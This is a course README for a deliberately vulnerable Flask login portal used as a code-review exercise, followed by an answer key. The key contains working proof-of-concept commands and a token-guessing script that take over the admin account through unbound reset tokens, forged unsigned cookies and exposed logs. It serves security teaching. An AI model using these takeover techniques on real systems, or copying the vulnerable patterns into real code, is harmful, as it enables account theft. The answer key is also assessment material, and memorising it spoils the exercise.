# Source Code Review Challenge — SecureVault

CS440 AY26T1 · Kee Hock · uv + Python + Flask, one file

A developer has submitted a staff account portal for security review before its
first release. It registers users, signs them in, lets them change their
password, and recovers access when they forget it. It looks fine. It runs
without errors. Every function has a sensible-sounding comment.

**It contains thirteen security findings, and at least four of them lead to full
account takeover.** Your job is to find them by reading the code.

```bash
cd week-6/password-system-challenge
uv run app.py                 # http://127.0.0.1:8000
uv run app.py --seed-only     # list the seeded accounts and exit
```

> **This is a deliberately vulnerable teaching target**, in the same spirit as
> [`week-7/rbac-demo`](../../week-7/rbac-demo/README.md), DVWA or WebGoat. It is
> not an example of how to build authentication — it is an example of how not
> to, written to be reviewed. Never copy a pattern from `app.py`, never expose
> it beyond `127.0.0.1`, and never type a real password into it. Every account
> and email address in it is fictional.

### How to work through this

About **60 minutes**: roughly 30 reading `app.py` against the five passes below,
15 writing the report, and 15 marking yourself against the answer key. Do the
two labs first — [`../cracking/`](../cracking/README.md) and
[`../simple-password-auth/`](../simple-password-auth/README.md) — because six of
the thirteen findings are those labs inverted, and you will spot them in
seconds if you have just built the correct version.

**Read before you run.** You can find every finding in this file without
starting the server, and two of them you can *only* find that way. Start the app
afterwards, to confirm what you already suspect — a reviewer who clicks first
tends to report what the interface makes obvious and miss what it hides.

## Objective

**By the end you will be able to review authentication code the way a security
engineer does — reading for the decisions a developer made rather than the
behaviour they intended — and write up each finding with its location, its
impact, and the code that fixes it.**

Finding a bug when you have been told there is one is easy. The skill being
built here is the *sweep*: working through unfamiliar code in a defined order,
asking a fixed set of questions at each stop, so that you find the bugs nobody
told you about. The answer key at the end is deliberately placed after the
method, the hints, and the report template — use it to mark yourself, not to
skip to.

This challenge is the assessment for week 6. The two labs that teach the
material it tests are:

- [`../cracking/`](../cracking/README.md) — why MD5 and an unsalted hash are
  fatal, and what an attacker does with a stolen hash.
- [`../simple-password-auth/`](../simple-password-auth/README.md) — what correct
  storage looks like. **Most of the answer key is that lab, inverted.**

## The brief

> **To:** Security review
> **From:** Engineering
> **Re:** SecureVault pilot — pre-release review
>
> Please review the attached `app.py` before we open the pilot to the wider
> team. It is a single file, about 500 lines. We are particularly interested in
> the account recovery flow since it was added late.
>
> The database will be Postgres in production, not a dictionary. Email delivery
> is not wired up yet. We consider the portal internal-only, so we have not
> prioritised hardening it.

That last sentence is the kind of thing you will be told in real life. Note it
and review the code anyway.

**Scope:** `app.py` only. **Out of scope:** the Flask framework itself, the
absence of TLS (assume a load balancer terminates it), and the in-memory store
standing in for a database.

**Deliverable:** a findings report. One entry per finding, in the format below,
ordered by severity.

## How to review it — the sweep

Do not read the file top to bottom looking for something suspicious. That is
how findings get missed. Work through these five passes instead; each one asks a
different question, and they are ordered so that later passes benefit from what
earlier ones told you.

**Pass 1 — Map the attack surface.** List every route and note which ones an
*unauthenticated* stranger can reach. `grep -n "@app\." app.py` gives you the
list in about ten seconds. For each route ask: *who is allowed to call this, and
where in the code is that enforced?* A route with no enforcement anywhere is a
finding on its own.

**Pass 2 — Follow the secret.** A password enters at a form field and should end
its life as a hash. Trace that path and write down every place the *plaintext*
is touched: assigned, stored, formatted into a string, passed to a function.
Every one of those is a potential disclosure. Do the same for the reset token.

**Pass 3 — Interrogate the crypto.** Find every hash, every comparison, every
generated secret. For each, ask the three questions from the storage lab: *Is
the function appropriate for this job? Is there a salt? Is the comparison
constant-time?* Then the fourth, for anything generated: *is the randomness
actually random?*

**Pass 4 — Attack the state machine.** The reset flow is a state machine: issue
a token, deliver it, consume it. For each transition ask *what stops me doing
this twice, late, or on behalf of somebody else?* Token bugs are almost never in
the cryptography; they are in the bookkeeping around it.

**Pass 5 — Read what the app tells a stranger.** Compare the responses for two
inputs that should be indistinguishable — a username that exists versus one that
does not. Any difference in text, status code or timing is information
disclosure.

Two habits that are worth more than any checklist:

- **Do not trust comments.** Several comments in this file accurately describe
  what the author *intended*. The bug is the gap between the comment and the
  code. `# One-way hash, so the database never contains a readable password` sits
  directly above a real finding, and the comment is not wrong about the goal.
- **Ask "what is this defending against?"** If you cannot name the attack a line
  of code stops, either you have not understood it or it is not defending
  anything.

## Report format

Use one block per finding. This is close to what a real report looks like, and
the answer key is written in the same shape so you can compare directly.

```
FINDING n — <one-line title>
  Severity   Critical / High / Medium / Low
  Location   app.py:<line>, function <name>
  Class      <e.g. CWE-916: Use of Password Hash With Insufficient
             Computational Effort>
  Issue      What the code does, in one or two sentences.
  Impact     What an attacker gains. Be concrete: "account takeover of any
             user, unauthenticated" beats "this is insecure".
  Evidence   The request or command that demonstrates it.
  Fix        The corrected code.
```

**Severity guidance.** Rate by *impact × ease*, not by how clever the bug is.
Anything giving an unauthenticated attacker another user's account is Critical.
Anything giving them credentials that work elsewhere is Critical. A bug that
only helps once you already have the database is High. Information disclosure
that enables a later attack is Medium.

## Hints

Stop here and do the sweep first. If you are stuck after a genuine attempt,
uncover one tier at a time.

<details>
<summary><b>Tier 1 — where to look</b> (no spoilers)</summary>

Thirteen findings, distributed like this:

| Area | Findings | Where |
|---|---|---|
| Password storage | 4 | `hash_password`, `verify_password`, and wherever a password is *kept* |
| Logging | 2 | `log`, `log_request`, and their callers |
| Reset flow | 4 | `make_reset_token`, `create_reset`, `forgot_submit`, `reset_submit` |
| Session handling | 1 | `current_user`, `sign_in` |
| Information disclosure | 2 | `login_submit`, `forgot_submit`, `/admin/*` |

The single richest function in the file is `reset_submit()`. Four separate
findings pass through it.
</details>

<details>
<summary><b>Tier 2 — the questions that find them</b></summary>

1. Which hash function is used for passwords, and what is that function *for*?
2. Two users pick the same password. Compare their stored hashes. What does that
   tell an attacker who steals the database?
3. `verify_password` compares two strings. With which operator?
4. The `previous_passwords` list stops password reuse. What is actually *in* it?
5. Read `log()`'s callers. Search the file for `password=`. What is being written
   to disk?
6. `log_request()` logs `request.full_path`. What appears in a reset URL?
7. `make_reset_token` hashes a "seed". What are the two ingredients, and which
   of them does an attacker already know?
8. What does `/forgot` put in the HTTP response body, and who can request it?
9. `TOKEN_TTL_MINUTES` is defined at the top of the file. Where is it *used*?
10. After a successful reset, is the token removed from `RESET_TOKENS`?
11. `reset_submit` validates the token, then decides whose password to change.
    Where does that username come from?
12. `current_user()` reads a cookie. What is in the cookie, and what would stop
    me writing it myself?
13. Compare the two failure messages in `login_submit`.
14. Who is allowed to call `/admin/logs` and `/admin/users`?
</details>

<details>
<summary><b>Tier 3 — the chain</b></summary>

Four findings combine into one unauthenticated account takeover with no
guessing at all. As an anonymous visitor:

1. Ask `/forgot` for a reset on **your own** account.
2. Read the token off the response page.
3. Post it to `/reset` — but change one field in the form.
4. Sign in as the administrator.

Work out which field, and you have findings 7, 9 and 11 at once. A second,
independent takeover exists that does not even need step 2.
</details>

---

# Answer key

Thirteen findings. Every "Evidence" command below was run against this app and
produced the output shown. Severity is impact × ease, as above.

The entries are grouped by theme so that related findings read together — **your
report should be ordered by severity instead**, as the brief asks. Each entry
carries its own rating, so re-ranking them is a five-minute exercise and a
worthwhile one: it forces you to compare a broken hash against a broken cookie
and defend the order.

Start the server before working through these:

```bash
uv run app.py --port 8000
```

---

### FINDING 1 — Password reset token is not bound to the account it was issued for

- **Severity:** Critical
- **Location:** `app.py`, `reset_submit()`
- **Class:** CWE-639: Authorization Bypass Through User-Controlled Key (IDOR)

**Issue.** The handler checks that the submitted token exists in `RESET_TOKENS`,
then changes the password of whatever account the *form* named. `RESET_TOKENS`
stores the username the token was issued for, and that stored value is never
read:

```python
if token not in RESET_TOKENS:          # is this token real?
    return ...                          # ... but for WHOM?
user = USERS.get(username)              # username comes from the request
user["password_hash"] = hash_password(new)
```

**Impact.** Full account takeover of any user, by anyone who can create an
account or request a reset for themselves. No guessing, no cracking, no
interception. This is the worst finding in the file.

**Evidence.**

```bash
# Get a perfectly legitimate token for j.rivera — an account we control
T=$(curl -s -X POST localhost:8000/forgot -d "username=j.rivera" \
    | grep -o 'token=[a-f0-9]*' | head -1 | cut -d= -f2)

# Use it to set the ADMINISTRATOR's password
curl -s -X POST localhost:8000/reset \
     -d "token=$T&username=admin&password=pwned123" | grep -o 'password has been set'
# -> password has been set

curl -s -X POST localhost:8000/login -d "username=admin&password=pwned123" \
     -o /dev/null -w "%{http_code} -> %{redirect_url}\n"
# -> 302 -> http://localhost:8000/dashboard
```

**Fix.** The token is the only thing that carries authority. Take the username
*from the token record*, never from the request.

```python
record = RESET_TOKENS.get(token)
if record is None:
    return page(...)                      # generic failure
user = USERS[record["username"]]          # the token decides whose account
```

---

### FINDING 2 — Reset token is predictable

- **Severity:** Critical
- **Location:** `app.py`, `make_reset_token()`
- **Class:** CWE-340: Generation of Predictable Numbers or Identifiers

**Issue.**

```python
seed = f"{username}{int(time.time())}"
return hashlib.md5(seed.encode("utf-8")).hexdigest()
```

Both ingredients are known to the attacker. The username is public; the time is
the current time. The token has, at most, **the entropy of "how unsure am I
about the clock"** — a few hundred possibilities, not 2¹²⁸. MD5 does not help:
hashing a guessable input gives a guessable output. The docstring calls it
"unguessable", which is the comment-versus-code gap the sweep warns about.

**Impact.** An attacker who knows a username can trigger a reset and derive the
token without ever seeing it — no email access, no network interception.
Unauthenticated account takeover of any named user.

**Evidence.** The victim requests a reset. The attacker, who never sees the
page, recovers the token in 301 guesses:

```python
import hashlib, time, urllib.request, urllib.parse
now, victim = int(time.time()), "t.chen"
for offset in range(-300, 301):                     # ±5 minutes of clock drift
    tok = hashlib.md5(f"{victim}{now+offset}".encode()).hexdigest()
    data = urllib.parse.urlencode({"token": tok, "username": victim,
                                   "password": "attacker999"}).encode()
    if "password has been set" in urllib.request.urlopen(
            "http://localhost:8000/reset", data).read().decode():
        print("recovered:", tok); break
# -> recovered: 88e688ce7e240d97e2bdba0c75fd4882   (offset +0s)
```

**Fix.** A reset token is a bearer credential. Generate it from a CSPRNG and
derive it from nothing.

```python
import secrets
def make_reset_token() -> str:
    return secrets.token_urlsafe(32)      # 256 bits, unrelated to any input
```

---

### FINDING 3 — Plaintext passwords are written to the application log

- **Severity:** Critical
- **Location:** `app.py`, `login_submit()`, `register_user()`,
  `change_password_submit()`, `reset_submit()`
- **Class:** CWE-532: Insertion of Sensitive Information into Log File

**Issue.** Four call sites interpolate the plaintext password into a log line:

```python
log(f"LOGIN attempt username={username} password={password}")
log(f"REGISTER username={username} email={email} password={password}")
log(f"PASSWORD_CHANGED username={user['username']} new={new}")
log(f"PASSWORD_RESET username={username} token={token} new={new}")
```

`log()` writes to `EVENTS` *and* appends to `./app.log`.

**Impact.** Every password in the system, in plaintext, in a file. This defeats
the entire point of hashing: the careful storage in the database is irrelevant
when the same value sits in a log beside it. Logs are the least-protected data a
company holds — they are shipped to aggregators, copied into tickets, read by
support staff, retained for years, and rarely in scope for encryption. And
because people reuse passwords, this leaks credentials for *other* systems too.

Note that the login logger fires **before** authentication, so the file also
collects the passwords of failed attempts — including users typing their
password into the wrong field, and their passwords for other services.

**Evidence.**

```bash
grep -oE "LOGIN attempt .*" app.log | head -3
# 2026-09-22 17:41:03  LOGIN attempt username=t.chen password=wrong
# 2026-09-22 17:41:04  LOGIN attempt username=admin password=pwned123
```

**Fix.** Never let the plaintext reach a formatter. Log the *event*, not the
credential.

```python
log(f"LOGIN attempt username={username}")          # no password, ever
log(f"PASSWORD_CHANGED username={user['username']}")
```

Then make it hard to reintroduce: a CI grep for `password=` in log calls, a
redacting log filter, and a review rule that any new field in a log line must be
justified.

---

### FINDING 4 — Reset tokens are written to the log, including via the request URL

- **Severity:** High
- **Location:** `app.py`, `create_reset()`, `log_request()`, `reset_submit()`
- **Class:** CWE-532 / CWE-598: Use of GET Request Method With Sensitive
  Query Strings

**Issue.** `create_reset()` logs the token it just issued, and `log_request()`
logs `request.full_path` on *every* request — which, for the reset link, is the
token itself:

```python
log(f"REQUEST {request.method} {request.full_path}")
```

**Impact.** Anyone who can read the log can hijack any in-flight password reset.
Combined with **finding 5** (the log is served to anonymous users) this is
remote, unauthenticated account takeover. Independently: tokens in URLs also
leak through browser history, the `Referer` header to any third-party asset on
the page, and proxy logs.

**Evidence.**

```bash
grep -oE "REQUEST GET /reset.token=[a-f0-9]{32}&username=admin" app.log
# REQUEST GET /reset?token=085e05a44e11357ca0ba34d15e515e3e&username=admin
grep -oE "RESET_ISSUED username=admin token=[a-f0-9]{32}" app.log
# RESET_ISSUED username=admin token=085e05a44e11357ca0ba34d15e515e3e
```

**Fix.** Log an opaque identifier, never the credential, and strip query strings
from request logging:

```python
log(f"RESET_ISSUED username={username} token_id={token_id}")   # not the token
log(f"REQUEST {request.method} {request.path}")                # no query string
```

Better still, deliver the token in a one-time link that the reset page
immediately exchanges for a short-lived form POST, so it never persists in a URL.

---

### FINDING 5 — Log and account listings are served to unauthenticated users

- **Severity:** Critical
- **Location:** `app.py`, `admin_logs()`, `admin_users()`
- **Class:** CWE-306: Missing Authentication for Critical Function

**Issue.** Both routes are under `/admin/` and neither checks anything at all.
There is no decorator, no `current_user()` call, no `is_admin` test. The path
prefix is the only thing suggesting they are protected, and a path prefix is not
a control.

**Impact.** Anonymous disclosure of every password in the system (via the logs,
finding 3), every reset token (finding 4), every username, every email address,
and every password hash (findings 6 and 7). This single finding converts three
"you would need the database" findings into remote ones.

**Evidence.**

```bash
curl -s localhost:8000/admin/users | grep -o 'e10adc3949ba59abbe56e057f20f883e'
# e10adc3949ba59abbe56e057f20f883e     <- no cookie, no login

curl -s localhost:8000/admin/logs | grep -oE "password=[^ <]*" | head -2
```

**Fix.** Authenticate *and* authorise every administrative route, and default to
deny:

```python
from functools import wraps

def admin_required(view):
    @wraps(view)
    def wrapper(*a, **kw):
        user = current_user()
        if user is None:
            return redirect("/login")
        if not user["is_admin"]:
            return page("Forbidden", "..."), 403
        return view(*a, **kw)
    return wrapper

@app.get("/admin/logs")
@admin_required
def admin_logs(): ...
```

Password hashes should not be rendered in a support UI at all, whoever is
looking.

---

### FINDING 6 — Passwords are hashed with MD5

- **Severity:** Critical
- **Location:** `app.py`, `hash_password()`
- **Class:** CWE-916: Use of Password Hash With Insufficient Computational
  Effort / CWE-327: Use of a Broken Cryptographic Algorithm

**Issue.**

```python
def hash_password(password: str) -> str:
    """One-way hash, so the database never contains a readable password."""
    return hashlib.md5(password.encode("utf-8")).hexdigest()
```

The comment is right about the goal and the code is wrong about the method. MD5
is a *general-purpose* hash, designed to be fast — which is precisely the
property a password hash must not have. A current GPU computes MD5 at roughly
10¹¹ hashes per second.

**Impact.** Any stolen hash is crackable. At 10¹¹ guesses/sec the entire
8-character lowercase space falls in about two seconds, and every password in
any breach corpus falls instantly. See [`../cracking/`](../cracking/README.md),
Part 4, for the measured comparison against a slow hash.

**Evidence.** No tooling required — MD5 hashes of common passwords are in every
public rainbow table:

```bash
uv run app.py --seed-only
#   t.chen   123456   e10adc3949ba59abbe56e057f20f883e
```

Paste that hash into any search engine. It is arguably the single most widely
published MD5 digest in existence, and it resolves to `123456` on the first hit.

**Fix.** Use a memory-hard KDF with the OWASP baseline parameters, exactly as in
[`../simple-password-auth/`](../simple-password-auth/README.md):

```python
from argon2 import PasswordHasher              # argon2-cffi
ph = PasswordHasher(time_cost=2, memory_cost=19*1024, parallelism=1)

def hash_password(password: str) -> str:
    return ph.hash(password)                   # salt generated and embedded

def verify_password(username, password) -> bool:
    user = USERS.get(username)
    if user is None:
        ph.hash(password)                      # equalise timing, finding 11
        return False
    try:
        return ph.verify(user["password_hash"], password)
    except Exception:
        return False
```

---

### FINDING 7 — Password hashes are unsalted

- **Severity:** High
- **Location:** `app.py`, `hash_password()`
- **Class:** CWE-759: Use of a One-Way Hash Without a Salt

**Issue.** `hash_password()` takes one input. There is no per-user random value,
so the function is deterministic across the entire user base.

**Impact.** Three separate consequences, and students routinely name only the
first:

1. **Precomputation works.** One rainbow table cracks the whole database, and
   the work amortises across every user.
2. **Shared passwords are visible.** Identical hashes reveal which accounts use
   the same password — often the most valuable thing in a dump, because cracking
   one opens several.
3. **Cross-database correlation.** The same hash in two different breaches
   identifies the same password, so a crack anywhere is a crack everywhere.

Note that salting would **not** slow down cracking a single targeted hash. Its
job is to destroy amortisation. (Students who think otherwise should do
extension 7.5 in [`../cracking/`](../cracking/README.md).)

**Evidence.**

```bash
curl -s -X POST localhost:8000/register -d "username=alpha&email=a@x.test&password=hunter22" -o /dev/null
curl -s -X POST localhost:8000/register -d "username=beta&email=b@x.test&password=hunter22"  -o /dev/null
curl -s localhost:8000/admin/users | grep -oE "(alpha|beta)|[a-f0-9]{32}"
# alpha
# cb95015a436fe976eb38e45455372032
# beta
# cb95015a436fe976eb38e45455372032      <- identical
```

**Fix.** Covered by finding 6 — `argon2-cffi` generates a 16-byte CSPRNG salt
per call and embeds it in the PHC string. You do not manage it yourself.

---

### FINDING 8 — Plaintext passwords are retained in password history

- **Severity:** Critical
- **Location:** `app.py`, `register_user()`, `change_password_submit()`,
  `reset_submit()`, `seed()`
- **Class:** CWE-256: Plaintext Storage of a Password

**Issue.** The reuse check is implemented by keeping the plaintext:

```python
"previous_passwords": [password],        # so we can stop people reusing one
...
if new in user["previous_passwords"]:    # compares plaintext
    return ...
user["previous_passwords"].append(new)
```

**Impact.** The database contains every password each user has ever chosen, in
plaintext. This is *worse* than the MD5 finding — there is nothing to crack. It
is also the finding most likely to be missed in review, because the feature
(preventing password reuse) is a legitimate security control and reviewers tend
to nod at it. **A security feature implemented insecurely is still a
vulnerability.**

Note that `reset_submit()` appends to the history but never checks it, so the
reuse control does not even work on the reset path.

**Evidence.** Read the store: `USERS["t.chen"]["previous_passwords"]` is
`['123456']` at startup and grows with every change. It is not displayed in the
UI, which is exactly why this one has to be found by reading.

**Fix.** Store *hashes* of previous passwords and verify a candidate against
each one. History entries are hashes like any other, so they go through the same
primitive as the live password (finding 6's `PasswordHasher`):

```python
def used_before(user: dict, candidate: str) -> bool:
    for old_hash in user["previous_hashes"]:
        try:
            if ph.verify(old_hash, candidate):    # constant-time, per entry
                return True
        except Exception:
            continue                              # this one did not match
    return False


# at registration — the record field replaces "previous_passwords"
USERS[username] = {..., "previous_hashes": [hash_password(password)]}

# on change or reset
if used_before(user, new):
    return page("Change password",
                '<div class="msg err">You have used that password before.</div>')
user["password_hash"] = hash_password(new)
user["previous_hashes"] = (user["previous_hashes"] + [user["password_hash"]])[-5:]
```

This costs one KDF evaluation per historic entry — which at 19 MiB apiece is why
you cap the list, here at five. Apply the same check on the reset path, which
currently appends to the history without ever consulting it.

---

### FINDING 9 — Reset tokens never expire and are never consumed

- **Severity:** High
- **Location:** `app.py`, `create_reset()`, `reset_submit()`,
  `TOKEN_TTL_MINUTES`
- **Class:** CWE-613: Insufficient Session Expiration

**Issue.** `TOKEN_TTL_MINUTES = 30` is defined at the top of the file, printed
to the user — *"This link expires in 30 minutes"* — and **never read by any code
path**. `create_reset()` records an `issued` timestamp that nothing compares
against, and `reset_submit()` never deletes the token after a successful reset.

A constant that is displayed but not enforced is worse than no constant: it
documents a control that does not exist, and a reviewer skimming for "is there a
TTL?" will find it and move on.

**Impact.** Every reset token ever issued remains valid forever and can be used
an unlimited number of times. A token found in an old email, a browser history,
a log file, or a support ticket from last year still works today. Combined with
finding 1, one token is a permanent master key to every account in the system.

**Evidence.** Re-using the *same* token from finding 1 against a *third*
account, after it had already been spent:

```bash
curl -s -X POST localhost:8000/reset \
     -d "token=$T&username=m.okafor&password=pwned456" | grep -o 'password has been set'
# -> password has been set          <- second use, different victim
```

**Fix.** Enforce the TTL and consume the token atomically:

```python
record = RESET_TOKENS.pop(token, None)        # single-use: gone once read
if record is None:
    return page(...)
age = datetime.datetime.now() - record["issued"]
if age > datetime.timedelta(minutes=TOKEN_TTL_MINUTES):
    return page(...)                          # expired
```

Also invalidate any outstanding tokens for an account whenever its password
changes, and invalidate the user's active sessions on reset.

---

### FINDING 10 — The reset token is disclosed in the HTTP response

- **Severity:** Critical
- **Location:** `app.py`, `forgot_submit()`
- **Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

**Issue.** Email delivery is not configured, so the developer displayed the link
on screen instead:

```python
# Email delivery is not wired up in the pilot, so show the link on screen.
return page("Recover access", f"""... <pre>{html_mod.escape(link)}</pre> ...""")
```

**Impact.** The entire security of a password reset rests on one assumption:
only the account's owner can read the token, because it goes to their inbox.
Printing it to the requester destroys that assumption. **Anyone** can type any
username into `/forgot` and be handed that account's reset token directly.

Combined with finding 1, this is a two-request, unauthenticated takeover of any
account — and it needs no guessing at all.

This is the classic "temporary development shortcut" finding. It is temporary
until it ships.

**Evidence.**

```bash
curl -s -X POST localhost:8000/forgot -d "username=admin" | grep -o '/reset?token=[a-f0-9]*&username=admin'
# /reset?token=e83c4e3eb278cfd44ffbdedc8e19f08e&username=admin
```

**Fix.** The token must leave through a channel the requester does not control.
Send it to the address on file; return the same neutral message either way:

```python
if username in USERS:
    token = create_reset(username)
    send_reset_email(USERS[username]["email"], token)     # out-of-band
return page("Recover access",
            '<div class="msg ok">If that account exists, we have sent a reset '
            'link to its registered address.</div>')
```

If email genuinely is not ready, the correct interim behaviour is for the
feature to be **disabled**, not to print the secret.

---

### FINDING 11 — Username enumeration on login and reset

- **Severity:** Medium
- **Location:** `app.py`, `login_submit()`, `forgot_submit()`
- **Class:** CWE-204: Observable Response Discrepancy

**Issue.** The failure messages distinguish the two cases:

```python
if username not in USERS:
    return ... 'No account with that username.'
if not verify_password(username, password):
    return ... 'Incorrect password.'
```

`forgot_submit()` does the same: *"We have no account with that username."*
There is a timing oracle here too — the unknown-user path returns without
hashing anything.

**Impact.** An attacker can confirm which accounts exist before guessing a
single password, turning a spray across a wordlist of usernames into a targeted
attack on a validated list. It also leaks organisational information: who works
here, who has left, what the username convention is. Note how that convention
(`t.chen`, `j.rivera`) is derivable from two examples — which connects directly
to the CT-log reconnaissance in week 5 and the targeted attack in
[`../cracking/`](../cracking/README.md), Part 3(b).

**Evidence.**

```bash
curl -s -X POST localhost:8000/login -d "username=nosuchuser&password=x" | grep -o 'No account with that username'
curl -s -X POST localhost:8000/login -d "username=t.chen&password=wrong"  | grep -o 'Incorrect password'
```

**Fix.** One message, one code path, comparable timing:

```python
if not verify_password(username, password):     # dummy-hashes unknown users
    log(f"LOGIN failed username={username}")
    return page("Sign in", '<div class="msg err">Incorrect username or '
                           'password.</div>')
```

with `verify_password()` hashing against a dummy record when the user does not
exist, as in the finding 6 fix.

---

### FINDING 12 — The session cookie is an unsigned username

- **Severity:** Critical
- **Location:** `app.py`, `current_user()`, `sign_in()`
- **Class:** CWE-565: Reliance on Cookies without Validation and Integrity
  Checking

**Issue.**

```python
def sign_in(response, username: str):
    response.set_cookie("auth_user", username)

def current_user() -> dict | None:
    name = request.cookies.get("auth_user")
    return USERS.get(name) if name else None
```

The cookie *is* the identity claim. It is not signed, not encrypted, not tied to
any server-side session, and carries no integrity protection whatsoever. It also
lacks `HttpOnly`, `Secure` and `SameSite`.

**Impact.** Authentication bypass. Set the cookie to any username and you are
that user — no password, no token, no reset. Every password control in the file
is bypassed by one header. Because `current_user()` also drives `is_admin`,
this is instant administrative access.

**Evidence.**

```bash
curl -s -b "auth_user=admin" localhost:8000/dashboard | grep -o 'Hello, admin'
# Hello, admin          <- never logged in
```

**Fix.** Use a server-side session keyed by an unguessable identifier, or a
signed cookie. With Flask, `flask.session` does the signing for you:

```python
app.secret_key = os.environ["SECRET_KEY"]        # from the environment, not source
app.config.update(SESSION_COOKIE_HTTPONLY=True,
                  SESSION_COOKIE_SECURE=True,
                  SESSION_COOKIE_SAMESITE="Lax")

from flask import session
def sign_in(response, username): session["user"] = username; return response
def current_user(): return USERS.get(session.get("user"))
```

Regenerate the session identifier on login and on password change, and drop it
on logout.

---

### FINDING 13 — Password hash comparison is not constant-time

- **Severity:** Low
- **Location:** `app.py`, `verify_password()`
- **Class:** CWE-208: Observable Timing Discrepancy

**Issue.**

```python
return user["password_hash"] == hash_password(password)
```

Python's `==` on strings returns as soon as two characters differ. The time
taken to reject therefore encodes *how many leading hex characters* of the
stored digest the submitted password's digest matched.

**Impact.** In principle, an attacker who can measure response time precisely
enough can recover the stored digest position by position without ever guessing
the password, and then crack that digest offline — which finding 6 makes
trivial. **In practice this is the hardest finding in the file to exploit:**
network jitter dwarfs the signal, and the attacker cannot choose the digest
directly, only a preimage of it.

Rate it **Low**, and be able to say why. A reviewer who rates this Critical has
not thought about exploitability; a reviewer who omits it has not noticed the
pattern. Both are worth correcting, and the second is more common.

The pattern is what matters. The same `==` reflex applied to a value the
attacker *can* supply directly and vary freely — a session token, an API key, a
password reset token, an HMAC tag — is decisive rather than theoretical. Reach
for a constant-time comparison whenever both sides are secret-derived, and the
question of whether this particular instance is exploitable stops needing to be
argued.

**Evidence.** By inspection. Demonstrating it empirically needs a local harness,
thousands of samples and a statistical test — and over a network it generally
cannot be done at all. That gap between "real vulnerability class" and
"exploitable here" is exactly what a severity rating is for, and saying so in
the report is worth more than a proof-of-concept.

**Fix.**

```python
import secrets

def verify_password(username: str, password: str) -> bool:
    user = USERS.get(username)
    if user is None:
        hash_password(password)             # equalise the unknown-user path (F11)
        return False
    return secrets.compare_digest(user["password_hash"], hash_password(password))
```

Note that adopting the **finding 6** fix resolves this one as a side effect:
`argon2-cffi`'s `PasswordHasher.verify()` compares in constant time internally.
Choosing the right primitive removes whole classes of mistake, which is a better
outcome than remembering to patch each one.

---

## Observations (not counted among the thirteen)

Real reports separate *findings* from *observations* — things that are wrong but
not independently exploitable. Credit students who raise these:

- **No rate limiting or account lockout** on `/login`, `/forgot` or `/reset`.
  With MD5 and a six-character minimum, online guessing is viable on its own.
- **Weak password policy.** `MIN_PASSWORD_LENGTH = 6`, no breach-corpus check.
  The seeded accounts include `123456` and `Passw0rd`, which tells you what the
  policy permits in practice.
- **No re-authentication for `/change-password`** beyond the current password —
  acceptable, but the session should be regenerated afterwards.
- **No CSRF protection** on any state-changing POST.
- **Seeded credentials in source.** Fine for a teaching app; in a real
  repository, a seeded admin password is a finding in its own right.
- **Unbounded log growth** and no rotation, with `EVENTS` held in memory forever.

## How the findings chain

Individually these are thirteen bugs. The reason the report is ordered by severity
rather than by line number is that they *compose*, and a good report says so
explicitly:

```
  Chain A — two requests, no guessing, anonymous
    F10 (token printed in the response)
      └─▶ F1 (token not bound to an account)
            └─▶ administrator takeover

  Chain B — no interaction with the victim at all
    F2 (token derived from username + clock)
      └─▶ F9 (token never expires, never consumed)
            └─▶ takeover of any named account, repeatedly

  Chain C — one request, no credentials
    F12 (cookie is an unsigned username)
      └─▶ administrator takeover

  Chain D — harvest rather than attack
    F5 (admin routes unauthenticated)
      ├─▶ F3 (plaintext passwords in the log)  ─▶ credentials for OTHER systems
      ├─▶ F4 (tokens in the log)               ─▶ hijack any in-flight reset
      └─▶ F6 + F7 (unsalted MD5)               ─▶ crack the rest offline
```

Chain D is the one worth dwelling on. Findings 6 and 7 look like "you would
already need the database" — until finding 5 hands the database to anonymous
visitors. **Severity is a property of the system, not of the line of code.**

## Marking guide

| Band | What it looks like |
|---|---|
| **Pass** | Finds the three headline categories — MD5 (F6), password logging (F3), and at least two reset-flow findings — with correct locations. |
| **Good** | Nine or more findings, each with a correct impact statement and a fix that would actually work. |
| **Strong** | Eleven or more, *plus* at least one chain identified, *plus* F8 (plaintext password history) — the finding that requires reading rather than clicking. |
| **Exceptional** | All thirteen, correctly severity-ranked, with the observations separated from the findings, F9 caught via the unused `TOKEN_TTL_MINUTES` constant rather than by experiment, and F13 rated *Low* with the exploitability argument spelled out. |

The two findings that best separate a careful reviewer from a fast one are **F8**
and **F9**, for slightly different reasons. **F8** is invisible in the browser
entirely — `previous_passwords` is never rendered anywhere, so the only way to
find it is to read `register_user()`. **F9** *is* reachable by experiment, if you
think to re-use a spent link — but the interface actively discourages you from
trying, because it printed *"This link expires in 30 minutes"* over a constant
no code path ever reads. Both are guarded by something that **claims the control
exists**: a comment in one case, a displayed constant in the other. That is the
habit being marked.

---

## Rebuilding it correctly

The fixes above are per-finding. If you want the whole thing done right, the
reference implementation is next door:

- [`../simple-password-auth/`](../simple-password-auth/README.md) — correct
  storage, end to end: CSPRNG salt, Argon2id, constant-time comparison,
  parameters stored beside the hash. Its "Where this stops" section lists the
  controls this app also lacks, and its extensions 8.3 (enumeration) and 8.5
  (pepper) are direct fixes for findings here.
- [`../cracking/`](../cracking/README.md) — why findings 6 and 7 are rated the
  way they are, with the arithmetic.
- [`../../week-7/rbac-demo/`](../../week-7/rbac-demo/README.md) — the same
  exercise one layer up: what a user may *do* once authenticated, and seven more
  planted bugs.

**A good exit exercise:** fix all thirteen in `app.py`, then hand your version to
another student to review. Finding bugs and not reintroducing them are different
skills, and the second one is harder.

---

> **Ethics.** SecureVault is vulnerable by design, for teaching, and runs on
> `127.0.0.1` only. Every account, password and email address in it is invented.
> The review techniques transfer to real systems; the permission does not. Test
> only what you own or have written authorisation to test — in Singapore,
> unauthorised access is an offence under the Computer Misuse Act.
